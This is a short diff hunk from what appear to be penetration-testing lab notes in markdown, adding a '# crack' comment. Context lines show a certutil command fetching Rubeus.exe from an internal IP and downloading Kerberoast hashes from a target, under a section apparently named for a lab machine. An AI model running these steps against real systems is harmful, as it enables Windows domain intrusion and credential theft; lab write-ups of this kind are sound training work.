@@ -973,6 +973,8 @@ certutil -urlcache -split -f http://192.168.45.192/Rubeus.exe
 # Ctrl + D
 download ./kerberoast.hashes
 
+# crack
+
 ```
 
 ### Resourced
